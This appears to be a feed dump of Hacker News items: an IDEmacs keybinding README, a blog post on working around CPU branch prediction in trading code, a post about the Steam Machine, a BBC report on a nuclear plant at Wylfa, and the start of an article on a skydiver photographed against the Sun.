        &lt;cell&gt;&lt;code&gt;C-1&lt;/code&gt; / &lt;code&gt;C-2&lt;/code&gt; / &lt;code&gt;C-3&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Focus into 1st, 2nd, 3rd editor group&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;select-window-1&lt;/code&gt;, &lt;code&gt;select-window-2&lt;/code&gt;, &lt;code&gt;select-window-3&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;FIXME - behaviour differs from VSCode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-&amp;lt;left&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Focus into previous editor group&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-&amp;lt;right&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Focus into next editor group&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-&amp;lt;prior&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Move editor left&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-&amp;lt;next&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Move editor right&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k &amp;lt;left&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Move active editor group left/up&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k &amp;lt;right&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Move active editor group right/down&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;File management&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Keybinding&lt;/cell&gt;
        &lt;cell role="head"&gt;VSCode description&lt;/cell&gt;
        &lt;cell role="head"&gt;IDEmacs-VSCode command&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-n&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;New file&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;untitled-new-buffer&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-o&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Open file&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;find-file&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-s&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Save&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;save-buffer&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-s&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Save As&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;write-buffer&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-w&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Close&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;idemacs-kill-buffer-noprompt&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-w&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Close all&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-t&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Reopen closed editor&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k Enter&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Keep preview mode editor open&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-&amp;lt;tab&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Open next&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-&amp;lt;tab&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Open previous&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k p&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Copy path of active file&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k r&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Reveal active file in Explorer&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k o&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show active file in new window/instance&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;Help needed!&lt;/head&gt;
    &lt;p&gt;Users -&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Use IDEmacs. Observe newbies as they use IDEmacs.&lt;/item&gt;
      &lt;item&gt;Provide your feedback in our Jabber/XMPP room or in the issues.&lt;/item&gt;
      &lt;item&gt;Tell others about IDEmacs!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Developers -&lt;/p&gt;
    &lt;head rend="h3"&gt;Prior art&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;https://github.com/seamus-brady/mousemacs&lt;/p&gt;
        &lt;p&gt;From the author -&lt;/p&gt;
        &lt;p&gt;I created this abomination so I could learn Lisp without having to worry too much about learning Emacs. It was originally envisaged for me to use and then switch off as I learned Emacs. But I actually liked it better and now it is my main editor.&lt;/p&gt;
        &lt;p&gt;Mousemacs works pretty much like Sublime Text or Visual Studio Code out of the box. But it has the full power of Emacs underneath. All I did was take all the most useful Emacs packages and wrap them in a mouse friendly distribution. It is not perfect and certainly not for everyone, but it might be useful for some. It comes with a simple plain theme but it is still Emacs.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;How-to guides&lt;/head&gt;
    &lt;head rend="h3"&gt;How to temporarily try out a configuration&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Install required dependencies -&lt;/p&gt;
        &lt;list rend="ol"&gt;
          &lt;item&gt;Emacs v29 or better.&lt;/item&gt;
          &lt;item&gt;
            &lt;code&gt;git&lt;/code&gt;
          &lt;/item&gt;
          &lt;item&gt;DejaVu Sans Mono font&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Install optional dependencies -&lt;/p&gt;
        &lt;list rend="ol"&gt;
          &lt;item&gt;
            &lt;code&gt;grep&lt;/code&gt;
          &lt;/item&gt;
          &lt;item&gt;&lt;code&gt;locate&lt;/code&gt;or&lt;code&gt;plocate&lt;/code&gt;&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Clone the repository.&lt;/p&gt;
        &lt;code&gt;git clone https://codeberg.org/IDEmacs/IDEmacs&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Ensure you are connected to the Internet (so IDEmacs can download the necessary Emacs packages), and run IDEmacs.&lt;/p&gt;
        &lt;code&gt;emacs --init-directory=/path/to/IDEmacs/vscode&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://codeberg.org/IDEmacs/IDEmacs"/><published>2025-11-16T00:56:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45943279</id><title>Bypassing the Branch Predictor</title><updated>2025-11-16T15:08:47.582282+00:00</updated><content>&lt;doc fingerprint="b6f809966c3fc401"&gt;
  &lt;main&gt;
    &lt;p&gt;A couple of days ago I was thinking about what you can do when the branch predictor is effectively working against you, and thus pessimizing your program instead of optimizing it.&lt;/p&gt;
    &lt;p&gt;Let’s work with something relatively simple &amp;amp; concrete: consider that we want to write some kind of financial system (maybe a trading system) and all of our transaction requests arrive at a certain function before being either (a) sent out to some authoritative server, or (b) abandoned. Let’s also assume that:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The vast majority of our transaction requests end up being abandoned at the last step.&lt;/item&gt;
      &lt;item&gt;We care A LOT about the speed of the ‘send’ path and we want to make it as fast as possible.&lt;/item&gt;
      &lt;item&gt;We don’t care at all about the speed of the ‘abandon’ path.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The code would look roughly like this:&lt;/p&gt;
    &lt;table&gt;
      &lt;row/&gt;
    &lt;/table&gt;
    &lt;p&gt;The implication of assumption #1 is that the branch predictor will be heavily primed to predict that &lt;code&gt;should_send(t)&lt;/code&gt; returns &lt;code&gt;false&lt;/code&gt;. What this means is that when we finally get a transaction that
needs to be sent out, we’ll likely have to pay a branch misprediction penalty (~20 cycles); plus,
our &lt;code&gt;send()&lt;/code&gt; function may not be in the instruction cache just yet, because it’s so rarely executed.
Also, we won’t get the advantage of pipelining whatever instructions are needed for &lt;code&gt;send()&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Since we only care about the speed of the &lt;code&gt;send()&lt;/code&gt; path, I was wondering if there’s a way of telling
the CPU that we don’t actually want to rely on the branch predictor at all when executing &lt;code&gt;send()&lt;/code&gt;
or &lt;code&gt;abandon()&lt;/code&gt;: we always want to assume that &lt;code&gt;send()&lt;/code&gt; will be executed.&lt;/p&gt;
    &lt;head rend="h3"&gt;A low-level solution?&lt;/head&gt;
    &lt;p&gt;I asked Claude if there is such a way to basically hard-code branch prediction rules into the machine code, and the answer was that there’s no way to do this on x86, but there is a way on ARM: the &lt;code&gt;BEQP&lt;/code&gt; (predict branch taken) and &lt;code&gt;BEQNP&lt;/code&gt; (predict branch not taken) instructions.&lt;/p&gt;
    &lt;p&gt;Those ARM instructions are just hallucinated, and the reality is actually the other way around: ARM doesn’t have a way of hard-coding ‘predictions’, but x86 does. More accurately: some old x86 processors do. On the Pentium 4 series, those rules/hints are encoded as instruction prefixes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;0x2E&lt;/code&gt;(branch not taken);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;0x3E&lt;/code&gt;(branch taken).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So if a jump instruction came in with the prefix &lt;code&gt;0x3E&lt;/code&gt;, then the processor would assume that the
branch is taken.&lt;/p&gt;
    &lt;p&gt;On modern x86 processors, those instruction prefixes are simply ignored, so compilers obviously won’t even bother generating them when you’re targeting such a CPU.&lt;/p&gt;
    &lt;p&gt;Another ’low-level’ approach that doesn’t work here are the &lt;code&gt;[[likely]]&lt;/code&gt; and &lt;code&gt;[[unlikely]]&lt;/code&gt;
attributes introduced in C++20.
Those attributes will typically just reorder some labels/paths around to make sure that the path
which we mark as &lt;code&gt;[[likely]]&lt;/code&gt; will require less jumps. Whether we mark the &lt;code&gt;send()&lt;/code&gt; branch as likely
or we leave the code as-is, Clang and GCC generate the same assembly1:&lt;/p&gt;
    &lt;table&gt;
      &lt;row/&gt;
    &lt;/table&gt;
    &lt;p&gt;It won’t really matter that the &lt;code&gt;send()&lt;/code&gt; branch doesn’t need to do the jump at line 7, because the
branch predictor will be primed to assume the &lt;code&gt;abandon()&lt;/code&gt; branch nonetheless. If you’re writing code
for a modern x86 processor, you can consider that &lt;code&gt;[[likely]]&lt;/code&gt; and &lt;code&gt;[[unlikely]]&lt;/code&gt; are completely
unrelated to the CPU branch predictor, because the microarchitecture itself won’t have any way of
overriding its predictions. So those attributes are just a reordering mechanism. As noted in the
proposal doc, however, the
compiler could use the likely/unlikely hints to override the branch predictor:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Some of the possible code generation improvements from using branch probability hints include:&lt;/p&gt;
      &lt;item&gt;[…]&lt;/item&gt;
      &lt;item&gt;Some microarchitectures, such as Power, have branch hints which can override dynamic branch prediction.&lt;/item&gt;
    &lt;/quote&gt;
    &lt;head rend="h3"&gt;A higher-level solution?&lt;/head&gt;
    &lt;p&gt;So if we can’t bypass the branch predictor on modern x86 processors with some fine-grained and guaranteed mechanism, and we also don’t want to go buy a bunch of Pentium 4 CPUs and run our code on them, we need to think about a higher-level solution that works well enough; it doesn’t need to be guaranteed to work 100% of the time.&lt;/p&gt;
    &lt;p&gt;One such solution that I know of is one that Carl Cook talked about during his CppCon 17 talk2: we can fill our system with mocked transaction data for which &lt;code&gt;should_send(t)&lt;/code&gt; returns &lt;code&gt;true&lt;/code&gt;. We
have to do this enough times such that the mocked transaction data becomes the vast majority over
the real data, so the branch predictor will be primed to assume that the &lt;code&gt;send()&lt;/code&gt; path will be
executed practically on every &lt;code&gt;resolve()&lt;/code&gt; call. Overall, this may actually be a better approach than
hard-coding prediction rules, because those rules wouldn’t really guarantee us that the whole
&lt;code&gt;send()&lt;/code&gt; path would get executed (the assumption may just lead to partial execution, until the
&lt;code&gt;should_send(t)&lt;/code&gt; condition is actually evaluated and the pipeline is flushed; so at the end we may
still have important stuff not placed in the instruction/data cache).&lt;/p&gt;
    &lt;p&gt;For getting rid of those mocked transactions after they get ‘sent out’ from our program, Carl Cook mentions that network cards are capable of identifying and discarding such messages without adding significant overhead to the real transactions, so we can just leave it at that.&lt;/p&gt;
    &lt;p&gt;As mentioned in his talk, this whole ‘mocked/dummy transaction’ system gives him a 5 microsecond speed-up which, as the talk’s title suggests, matters a lot for his use case.&lt;/p&gt;
    &lt;p&gt;Thanks for reading!&lt;/p&gt;
    &lt;p&gt;You can check out the &lt;code&gt;r/cpp&lt;/code&gt; discussion regarding this blog post
here.&lt;/p&gt;
    &lt;p&gt;References:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Carl Cook’s CppCon talk (see footnote);&lt;/item&gt;
      &lt;item&gt;CppCon 2022: C++20’s [[likely]] Attribute - Optimizations, Pessimizations, and [[unlikely]] Consequences, page 33;&lt;/item&gt;
      &lt;item&gt;Answer to “Is there a compiler hint for GCC to force branch prediction to always go a certain way?” on Stackoverflow.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;This is not to say that&lt;/p&gt;&lt;code&gt;[[likely]]&lt;/code&gt;and&lt;code&gt;[[unlikely]]&lt;/code&gt;don’t have an effect generally speaking. It’s just that the default codegen for the code snippet that I gave is already one that makes the first branch ’likely’. If you negated the condition and swapped the 2 branches around, marking the&lt;code&gt;send()&lt;/code&gt;branch as&lt;code&gt;[[likely]]&lt;/code&gt;would change the generated assembly. ↩︎&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;CppCon 2017: Carl Cook “When a Microsecond Is an Eternity: High Performance Trading Systems in C++” ↩︎&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://nicula.xyz/2025/03/10/bypassing-the-branch-predictor.html"/><published>2025-11-16T06:51:25+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45943979</id><title>Maybe you’re not trying</title><updated>2025-11-16T15:08:47.517891+00:00</updated><content/><link href="https://usefulfictions.substack.com/p/maybe-youre-not-actually-trying"/><published>2025-11-16T10:14:25+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45943992</id><title>I don’t need a Steam Machine</title><updated>2025-11-16T15:08:47.207048+00:00</updated><content>&lt;doc fingerprint="d4d4f9b5ca386c77"&gt;
  &lt;main&gt;
    &lt;p&gt;For those of you who are living under a rock, Valve announced three new hardware devices joining their Steam Deck line-up: a new controller, a VR headset, and the GameCube—no wait, GabeCube—no wait, Steam Machine. The shiny little cube is undoubtedly Valve’s (second) attempt to break into the console market. This time, it might just work.&lt;/p&gt;
    &lt;p&gt;The hardware is ready to arrive in at your living room spring next year. The biggest question is: will it arrive at our living room? Reading all the hype has certainly enthused me (e.g. Brendon’s The Steam Machine is the Future, PC Gamer’s Valve is all over ARM, Eurogamer’s Steam Machine preview, ResetEra’s Steam Hardware thread); especially the part where the Machine is just a PC that happens to be tailored towards console gaming. According to Valve, you can install anything you want on it—it’s just SteamOS just like your trusty Deck, meaning you can boot into KDE and totally do your thing. Except that this shiny little cube is six times as powerful. I’m sure Digital Foundry will validate that next year.&lt;/p&gt;
    &lt;p&gt;However, this post isn’t about specs, expectations, or dreams: it’s about tempering my own enthusiasm. I’d like to tell myself why I don’t really need a Steam Machine. The following list will hopefully make it easier to say no when the buy buttons become available.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;You’re a retro gamer. &lt;lb/&gt;You don’t need the power of six Steam Decks. To do what, run DOSBox?&lt;/item&gt;
      &lt;item&gt;Your TV doesn’t support 4K.&lt;lb/&gt;Again, no need for those 4K 60 FPS.&lt;/item&gt;
      &lt;item&gt;You generally dislike AAA games. &lt;lb/&gt;With The Steam Machine, you might be able to finally properly run DOOM Eternal and all of the Assassin’s Creed games. That you don’t like playing.&lt;/item&gt;
      &lt;item&gt;You don’t have time to play games anyway.&lt;lb/&gt;Ouch, that hurts but it’s not untrue.&lt;/item&gt;
      &lt;item&gt;The TV will be occupied anyway.&lt;lb/&gt;The Steam Machine is not a Switch: you can’t switch to handheld mode. When are you going to play on the Machine if the TV is being used to watch your wife’s favourite shows?&lt;/item&gt;
      &lt;item&gt;You already have too many gaming related hardware pieces.&lt;lb/&gt;That’ll mean you’ll have to divide your time by an even bigger number to devote an equal amount to playing them.&lt;/item&gt;
      &lt;item&gt;There’s no room for yet another nondescript box under the TV.&lt;lb/&gt;See above: why don’t you first try to do something with that SNES Mini and PlayStation Mini besides letting it collect dust?&lt;/item&gt;
      &lt;item&gt;You’re a physical gamer.&lt;lb/&gt;This is Steam. There will be no insertion of cartridges, no blowing of carts, and no staring at game collections on a shelf.&lt;/item&gt;
      &lt;item&gt;It’s Steam, not Good Old Games.&lt;lb/&gt;Sure it can run GOG games but the Machine is primarily designed to run Steam. You avoid purchasing from Steam like the plague, yet you’re willing to buy a Machine dedicated to it? Are you crazy?&lt;/item&gt;
      &lt;item&gt;The last time you booted Steam was over a year ago.&lt;lb/&gt;Don’t tell me you’re suddenly interested in running the platform on a dedicated machine.&lt;/item&gt;
      &lt;item&gt;You don’t have time to fiddle with configuration.&lt;lb/&gt;Button and trackpad mappings to get the controls just right enough to play strategy games designed to be played with keyboard and mouse will only leave you frustrated.&lt;/item&gt;
      &lt;item&gt;Your MacBook can emulate Windows games just fine.&lt;lb/&gt;You recently bought CrossOver and played Wizordum and older Windows 98/XP stuff on it. It even runs Against The Storm flawlessly. No need for Proton or whatever.&lt;/item&gt;
      &lt;item&gt;In two years, you’ll upgrade your M1 to an M4+: there’s the power upgrade.&lt;lb/&gt;If CrossOver is struggling to run that particular game you so badly want to play, it’ll be buttery smooth in a few years. You’re going to do the laptop upgrade anyway regardless of the Steam Machine.&lt;/item&gt;
      &lt;item&gt;You already have a huge gaming backlog.&lt;lb/&gt;Thanks to your buddy Joel you bought too many physical Switch games that are still waiting to be touched. Are you really ready to open up another can of worms?&lt;/item&gt;
      &lt;item&gt;You dislike a digital backlog.&lt;lb/&gt;It’s easy to have hundreds of games on there: see your GOG purchases. Why don’t you try to count the ones that you actually played, let alone finished.&lt;/item&gt;
      &lt;item&gt;You’re not going to use the Machine to run office software.&lt;lb/&gt;Your laptop and other retro machines are good enough at handling that task. What are you really going to do with this cube besides gaming?&lt;/item&gt;
      &lt;item&gt;Those cool looking indie games will be released for Switch in due time anyway.&lt;lb/&gt;Remember Pizza Tower? It’s out on Switch now. Remember to buy the cart on Fangamer, together with the Anton Blast one.&lt;/item&gt;
      &lt;item&gt;It’s rumoured to cost more than &lt;code&gt;€600&lt;/code&gt;.&lt;lb/&gt;Save that money for a Switch 2 if the games are starting to become interesting to justify that upgrade, as currently, they’re not. Also, see the backlog point above.&lt;/item&gt;
      &lt;item&gt;All HDMI ports both on the TV and your external monitors are occupied.&lt;lb/&gt;Unless you’re willing to constantly switch cables, you’ll need to invest in a HDMI switch. Another&lt;code&gt;€100+&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;You can’t buy this without buying the Steam Controller.&lt;lb/&gt;That’s easily another&lt;code&gt;€80+&lt;/code&gt;you already spent buying the Mobapad controller for your Switch as a replacement for the semi-broken Joy Cons.&lt;/item&gt;
      &lt;item&gt;You can’t buy this as an expense on the company.&lt;lb/&gt;You’re closing down the company, remember. (More on that later)&lt;/item&gt;
      &lt;item&gt;The cool looking LED and programmable front display don’t justify an expensive purchase.&lt;lb/&gt;After the initial excitement wears off, the LED will become annoying and you’ll simply turn it off.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So you see, I don’t really need a Steam Machine…&lt;/p&gt;
    &lt;p&gt;Fuck it, I’m getting one.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://brainbaking.com/post/2025/11/why-i-dont-need-a-steam-machine/"/><published>2025-11-16T10:21:07+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45944056</id><title>UK's first small nuclear power station to be built in north Wales</title><updated>2025-11-16T15:08:46.893325+00:00</updated><content>&lt;doc fingerprint="bc8a14514bf49fd9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;UK's first small nuclear power station to be built in north Wales&lt;/head&gt;
    &lt;p&gt;A first-of-its-kind nuclear power station is to be built on Anglesey, bringing up to 3,000 jobs and billions of pounds of investment.&lt;/p&gt;
    &lt;p&gt;The plant at Wylfa, on the Welsh island's northern coast, will have the UK's first three small modular reactors (SMR), although the site could potentially hold up to eight.&lt;/p&gt;
    &lt;p&gt;Work is due to start next year with the aim of generating power by the mid 2030s.&lt;/p&gt;
    &lt;p&gt;Prime Minister Sir Keir Starmer said Britain was once a world leader in nuclear power but "years of neglect and inertia has meant places like Anglesey have been let down and left behind. Today, that changes."&lt;/p&gt;
    &lt;p&gt;The project, which could power about three million homes, will be built by publicly owned Great British Energy-Nuclear and is backed by a £2.5bn investment from the UK government.&lt;/p&gt;
    &lt;p&gt;Visiting a further education college in north Wales on Thursday, Sir Keir said the development would bring jobs for "decades to come" and that work would begin "virtually straight away".&lt;/p&gt;
    &lt;p&gt;Wales' First Minister Eluned Morgan, who said she had been "pressing the case at every opportunity for Wylfa's incredible benefits".&lt;/p&gt;
    &lt;p&gt;SMRs work similarly to large reactors, using a nuclear reaction to generate heat that produces electricity - but are a fraction of the size, with about a third of the generating output.&lt;/p&gt;
    &lt;p&gt;Ed Miliband, Secretary of State for Energy and Climate Change, called the announcement "exciting" and said Britain is in the race for new reactors.&lt;/p&gt;
    &lt;p&gt;Speaking on BBC Radio Wales Breakfast, Miliband added they hope to "work with local colleges to make sure that there are local skills providers, skills training opportunities, so local people get these jobs".&lt;/p&gt;
    &lt;p&gt;Simon Bowen, chair of Great British Energy-Nuclear, hailed an "historic moment for the UK".&lt;/p&gt;
    &lt;p&gt;Llinos Medi, the MP for Ynys Môn, the Welsh name for Anglesey, said it was a "game-changer" for the area "but only if local people see real and lasting benefits".&lt;/p&gt;
    &lt;p&gt;Mims Davies MP, the Shadow Secretary of State for Wales, said it will bring much-needed jobs and investment but "the current plan will only generate a fraction of the power that a Gigawatt-powered plant would".&lt;/p&gt;
    &lt;p&gt;Anthony Slaughter, leader of Wales Green Party, said the project was "an expensive distraction from the clean, fast and cheap renewables already available to us".&lt;/p&gt;
    &lt;p&gt;He added "a fast, ambitious roll-out of solar, wind and wave energy that will create jobs and cut energy bills" was needed.&lt;/p&gt;
    &lt;p&gt;The Federation of Small Businesses (FSB) Wales said the plant would bring a "once in a generation" boost for jobs, supply chains and regional infrastructure.&lt;/p&gt;
    &lt;p&gt;Great British Energy-Nuclear has also been tasked with identifying potential sites across the UK for another large-scale nuclear power plant, similar to those being built at Hinkley Point in Somerset and Sizewell in Suffolk, which can power the equivalent of six million homes.&lt;/p&gt;
    &lt;p&gt;The company will report back by autumn 2026, officials said.&lt;/p&gt;
    &lt;p&gt;It is not clear whether the SMR plans, which are smaller and more straightforward to build, rule Wylfa out after it was designated the preferred location in 2024 by the previous UK Conservative government.&lt;/p&gt;
    &lt;head rend="h2"&gt;'Nuclear equivalent of an Ikea chair'&lt;/head&gt;
    &lt;p&gt;Prof Simon Middleburgh, director of the Nuclear Futures Institute at Bangor University, said the SMRs would be "built in a modular manner in factories and shipped to the site to be put together a bit like an Ikea chair".&lt;/p&gt;
    &lt;p&gt;There were "a few more hurdles to go through", he cautioned - from securing regulatory approval, building the factories required to construct the SMRs and training the workforce that will run them.&lt;/p&gt;
    &lt;p&gt;Opponents of the project point to the fact that a long-term storage facility for the UK's nuclear waste is yet to be agreed upon and say investment in renewable energy schemes - wind, wave and tidal - is what Anglesey needs.&lt;/p&gt;
    &lt;p&gt;Dylan Morgan, of the People Against Wylfa-B campaign group, said the proposed SMRs were "an unnecessarily big development of an unproven technology".&lt;/p&gt;
    &lt;p&gt;The government sees them as a secure, reliable, affordable and low carbon energy system and is convinced that, with investment, SMRs will create thousands of jobs and boost manufacturing.&lt;/p&gt;
    &lt;p&gt;Wylfa beat competition from a site at Oldbury in Gloucestershire, with the reactors designed by Rolls-Royce, subject to final contracts, which are expected later this year.&lt;/p&gt;
    &lt;p&gt;The UK government said the plant would help provide energy independence.&lt;/p&gt;
    &lt;p&gt;The decision to opt for small modular reactors at Wylfa was criticised by the US ambassador Warren Stephens, who said he was "extremely disappointed".&lt;/p&gt;
    &lt;p&gt;He had urged ministers to commit to a large-scale plant, with US firm Westinghouse having reportedly presented plans for a new gigawatt station at the site.&lt;/p&gt;
    &lt;p&gt;Downing Street said the decision to build the power station in Wales "doesn't close the door" to a US manufacturer working on a future project.&lt;/p&gt;
    &lt;p&gt;The old nuclear power plant at Wylfa was switched off in 2015 and previous plans for a large-scale replacement fell through in 2021.&lt;/p&gt;
    &lt;p&gt;The company behind the scheme – the Japanese industrial giant Hitachi - cited spiralling costs and a failure to reach agreement with the UK government over funding.&lt;/p&gt;
    &lt;p&gt;There is a huge political component to the announcement, with Labour's leadership in Westminster keen to show it means business on big investment in infrastructure projects.&lt;/p&gt;
    &lt;p&gt;In Wales, the first minister has been pushing hard for Wylfa - and the announcement comes six months before the Senedd election.&lt;/p&gt;
    &lt;p&gt;Eluned Morgan has been trying to strike a balance: differentiating the Welsh party from UK Labour, while pushing for extra funding, further devolution of powers and big investment announcements from her UK colleagues.&lt;/p&gt;
    &lt;p&gt;She has certainly got the latter, although plenty of other issues such as reform to how Wales is funded and devolution of the Crown Estate – which owns much of the Welsh coastline and is vital to future wind power – remain unresolved.&lt;/p&gt;
    &lt;p&gt;Sign up for our Future Earth newsletter to keep up with the latest climate and environment stories with the BBC's Justin Rowlatt. Outside the UK? Sign up to our international newsletter here.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.bbc.com/news/articles/c051y3d7myzo"/><published>2025-11-16T10:38:41+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45944158</id><title>“The Fall of Icarus”: Photograph of a falling skydiver in front of the Sun</title><updated>2025-11-16T15:08:46.752936+00:00</updated><content>&lt;doc fingerprint="3681b04cbff34f8d"&gt;
  &lt;main&gt;&lt;p&gt;We love a good astronomy picture, thanks to prizes like the Astronomy Photographer Of The Year, the quality of astrophotography continues to grow with ever better composition and ideas. Yesterday, however, will be remembered as the day astrophotography had its bar raised by literal kilometers.&lt;/p&gt;The rest of this article is behind a paywall. Please sign in or subscribe to access the full content.&lt;p&gt;A collaboration between astrophotographer Andrew McCarthy and skydiver Gabriel C. Brown produced an image like we have never seen before. Called The Fall of Icarus, it shows Brown falling over an incredible image of the Sun in hydrogen alpha light. This is a specific wavelength that traces the turbulent hydrogen layer just above the Sun’s bright surface. The result speaks for itself.&lt;/p&gt;&lt;p&gt;The silhouette of Brown is neatly demarcated against the bubbling surface of the Sun. His downward trajectory is perfectly framed between sunspots, active regions on the surface of the Sun that are slightly cooler than their surrounding areas. This is not just a pretty picture; it is truly a masterpiece.&lt;/p&gt;&lt;p&gt;“Gabe and I met up to skydive a few months ago, and afterwards we had breakfast and were talking about how we could incorporate skydiving into astrophotography. This idea slowly evolved from there, to take a paramotor to altitude and have him jump while I got the shot,” McCarthy told IFLScience.&lt;/p&gt;&lt;p&gt;Put it like that, McCarthy almost makes it sound easy. It was not. The composition was planned; McCarthy, Brown, and the paramotor pilot were constantly talking to make sure everything would be aligned perfectly for the shot that McCarthy had in mind.&lt;/p&gt;&lt;p&gt;“This was quite tricky! I set up several cameras and got on a 3-way call with the pilot and Gabe. The pilot watched his shadow as he climbed in the aircraft, and when 